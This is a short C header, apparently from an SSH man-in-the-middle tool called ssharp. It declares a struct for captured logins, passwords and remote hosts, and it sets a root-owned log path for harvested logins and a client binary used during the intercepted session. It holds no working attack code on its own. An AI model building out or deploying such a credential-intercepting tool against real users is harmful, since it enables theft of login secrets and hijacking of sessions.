#ifndef __SSHARP_H__
#define __SSHARP_H__

#include <sys/types.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>


/* logins go here */
#ifndef SSHARP_LOG
#define SSHARP_LOG "/root/ssharp"
#endif

#ifndef SSHARP_DIR_PREFIX
#define SSHARP_DIR_PREFIX "/tmp/"
#endif

/* This is called during MiM session */
#ifndef SSHARP_CLIENT
#define SSHARP_CLIENT "/usr/local/bin/ssharpclient"
#endif

#define SSHARP_MINPORT 8888

typedef struct {
	char *login;
	char *pass;
	char *remote;
	u_short remote_port;
} sharp_t;

int socket_connect_b(struct sockaddr *, socklen_t, u_short);

int writen(int fd, const void *buf, size_t len);

int readn(int fd, char *buf, size_t len);

sharp_t sharp_dup(sharp_t *);

//#include "auth.h"
struct Authctxt;

struct Authctxt *auth_dup(struct Authctxt *);

int dstaddr(int, struct sockaddr_in *);

#define LINUX24

#endif // __SSHARP_H__

